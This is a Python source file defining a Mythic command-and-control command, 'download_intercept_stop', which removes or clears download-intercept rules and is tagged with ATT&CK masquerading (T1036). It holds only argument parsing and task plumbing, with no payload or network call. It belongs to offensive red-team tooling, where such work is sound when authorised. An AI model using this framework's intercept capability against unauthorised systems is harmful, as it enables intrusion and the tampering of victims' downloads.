from mythic_container.MythicCommandBase import (
    CommandBase, TaskArguments, CommandParameter, ParameterType,
    MythicTask, PTTaskMessageAllData, PTTaskProcessResponseMessageResponse,
    CommandAttributes,
)


class DownloadInterceptStopArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pattern",
                type=ParameterType.String,
                description="Pattern of the specific rule to remove. Leave blank to clear all rules.",
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line.strip():
            stripped = self.command_line.strip()
            if stripped.startswith("{"):
                self.load_args_from_json_string(stripped)
            else:
                self.add_arg("pattern", stripped)


class DownloadInterceptStopCommand(CommandBase):
    cmd            = "download_intercept_stop"
    needs_admin    = False
    help_cmd       = "download_intercept_stop [pattern]"
    description    = (
        "Remove a specific download intercept rule by pattern, or clear all rules "
        "if no pattern is provided."
    )
    version        = 1
    author         = "@asaurusrex"
    argument_class = DownloadInterceptStopArguments
    parameters     = []
    attackmapping  = ["T1036"]
    attributes     = CommandAttributes(filter_by_build_parameter={}, supported_os=[])

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        pattern = task.args.get_arg("pattern")
        task.display_params = f'pattern="{pattern}"' if pattern else "all rules"
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
